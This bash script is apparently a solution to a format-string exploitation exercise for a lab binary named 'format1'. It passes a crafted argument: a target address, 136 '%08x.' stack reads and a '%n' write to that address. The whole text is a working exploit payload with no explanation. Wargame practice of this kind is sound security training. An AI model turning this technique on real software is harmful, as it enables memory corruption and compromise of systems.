#!/bin/bash

./format1 $(python -c "print '\x38\x96\x04\x08__.'+'%08x.'*136+'+%n+'")
